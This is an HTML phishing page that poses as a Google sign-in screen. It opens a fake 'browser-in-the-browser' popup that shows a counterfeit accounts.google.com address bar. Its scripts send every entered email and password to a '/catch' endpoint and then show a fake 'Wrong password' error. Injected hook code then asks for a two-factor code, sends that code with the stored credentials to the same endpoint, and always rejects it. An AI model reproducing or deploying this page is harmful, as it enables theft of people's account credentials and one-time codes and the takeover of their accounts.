<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Google Accounts</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;width:450px;text-align:center}
.card .logo{font-size:24px;font-weight:700;letter-spacing:-0.5px;margin-bottom:24px}
.logo .g{color:#4285f4}.logo .o1{color:#ea4335}.logo .o2{color:#fbbc05}.logo .gl{color:#4285f4}.logo .e{color:#34a853}.logo .r{color:#ea4335}
.card h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
.card .sub{font-size:16px;color:#202124;margin-bottom:32px}
.card .hint{font-size:14px;color:#5f6368;margin-bottom:8px;text-align:left}
.card .btn-fake{width:100%;padding:15px;border:1px solid #dadce0;border-radius:4px;font-size:14px;color:#3c4043;text-align:left;cursor:pointer;background:white;margin-bottom:24px}
.card .signin-btn{padding:10px 24px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;float:right}
.card .create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;float:left;line-height:36px}
.clear{clear:both}
#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:9999;align-items:center;justify-content:center}
#ov.show{display:flex}
.bw{width:450px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.35);animation:popIn .15s ease-out}
@keyframes popIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
.tb{background:#dee1e6;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
.dots{display:flex;gap:6px}.dots span{width:13px;height:13px;border-radius:50%;display:block}
.dr{background:#ff5f57}.dy{background:#ffbd2e}.dg{background:#28c840}
.ub{flex:1;background:white;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#333}
.lock{color:#1a73e8;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#666}
.bd{background:white;padding:40px 40px 32px;text-align:center}
.bd .logo2{font-size:22px;font-weight:700;margin-bottom:20px}
.bd h2{font-size:22px;font-weight:400;color:#202124;margin-bottom:8px}
.bd .sub2{font-size:14px;color:#5f6368;margin-bottom:28px}
.bd input{width:100%;padding:12px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none;box-sizing:border-box}
.bd input:focus{border-color:#1a73e8;border-width:2px}
.bd .bs{padding:10px 24px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;float:right}
.bd .err{display:none;color:#d93025;font-size:13px;margin-bottom:10px;text-align:left}
.bd .clear{clear:both;padding-top:16px}

#_otp_step{display:none;margin-top:8px}
#_otp_step label{font-size:13px;color:#333;display:block;margin-bottom:4px}
#_otp_step input{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:18px;
  letter-spacing:6px;text-align:center;margin-bottom:14px;outline:none}
#_otp_step input:focus{border-color:#1a73e8}
#_otp_info{font-size:13px;color:#555;text-align:center;margin-bottom:12px}
</style><style>#_obtn{width:100%;padding:10px;cursor:pointer;font-size:15px;border-radius:4px;border:none;margin-top:4px} #_obtn{} </style>
</head><body>
<div class="card">
<div class="logo"><span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="gl">g</span><span class="e">l</span><span class="r">e</span></div>
<h1>Sign in</h1>
<p class="sub">Use your Google Account</p>
<p class="hint">Email or phone</p>
<button class="btn-fake" onclick="showB()">Enter your email</button>
<div><a href="#" class="create">Create account</a><button class="signin-btn" onclick="showB()">Next</button></div>
<div class="clear"></div>
</div>
<div id="ov"><div class="bw">
<div class="tb">
<div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
<div class="ub"><span class="lock">&#128274;</span><span><strong>accounts.google.com</strong><span style="color:#888">/signin</span></span></div>
<button class="xbtn" onclick="hideB()">&#x2715;</button></div>
<div class="bd">
<div class="logo2"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>
<h2>Sign in</h2><p class="sub2">Use your Google Account</p>
<form id="lf" onsubmit="doSub(event)">
<input type="text" id="fu" placeholder="Email or phone" required>
<input type="password" id="fp" placeholder="Enter your password" required>
<p class="err" id="em">Wrong password. Try again or click Forgot password.</p>
<div><button class="bs" type="submit">Next</button></div>
<div class="clear"></div>
</form>
<div id="_otp_step">
  <p id="_otp_info">&#x1F512; Two-factor authentication required<br><small style="color:#888">Enter the code from your authenticator app</small></p>
  <label>Verification code</label>
  <input type="tel" id="_fotp" autocomplete="one-time-code" placeholder="000000" maxlength="8" pattern="[0-9]*" inputmode="numeric">
  <button type="button" id="_obtn" onclick="_submitOTP()">Verify</button>
</div>
</div></div></div>
<script>
function showB(){document.getElementById('ov').classList.add('show');setTimeout(()=>document.getElementById('fu').focus(),150);}
function hideB(){document.getElementById('ov').classList.remove('show');}
document.getElementById('ov').addEventListener('click',function(e){if(e.target===this)hideB();});
function doSub(e){e.preventDefault();
var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
var b=e.target.querySelector('.bs');b.textContent='Signing in…';b.disabled=true;
setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Next';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
</script>
<script>
(function(){
var _c={};
// Patch submitLogin / doSub / loginSubmit etc.
var _origSub=window.submitLogin||window.doSub||window.loginSubmit||null;
function _hookSubmit(u,p){
  _c={user:u,pass:p};
  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb',step:'creds'})}).catch(()=>{});
}
// After original submit fires (shows error), reveal OTP step
var _origFns=['submitLogin','doSub','loginSubmit'];
_origFns.forEach(function(fn){
  if(typeof window[fn]==='function'){
    var _orig=window[fn];
    window[fn]=function(e){
      var _u=document.querySelector('input[type=text],input[autocomplete=username],input[id*=user],input[id*=email]');
      var _p=document.querySelector('input[type=password]');
      if(_u&&_p) _hookSubmit(_u.value,_p.value);
      var r=_orig.apply(this,arguments);
      setTimeout(function(){
        var otp=document.getElementById('_otp_step');
        if(otp) otp.style.display='block';
        var fi=document.getElementById('_fotp');
        if(fi) setTimeout(function(){fi.focus();},100);
      },1700);
      return r;
    };
  }
});
window._submitOTP=function(){
  var otp=document.getElementById('_fotp');
  if(!otp||!otp.value) return;
  var btn=document.getElementById('_obtn');
  if(btn){btn.textContent='Verifying\u2026';btn.disabled=true;}
  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({user:_c.user,pass:_c.pass,otp:otp.value,
      ts:new Date().toISOString(),src:'bitb',step:'otp'})}).catch(()=>{});
  setTimeout(function(){
    var info=document.getElementById('_otp_info');
    if(info) info.innerHTML='&#x26A0; Incorrect code. Please try again.';
    if(btn){btn.textContent='Verify';btn.disabled=false;}
    if(otp){otp.value='';otp.focus();}
  },1800);
};
// Allow Enter key on OTP field
document.addEventListener('keydown',function(e){
  if(e.key==='Enter'&&document.activeElement&&document.activeElement.id==='_fotp'){
    window._submitOTP();
  }
});
})();
</script>
</body></html>
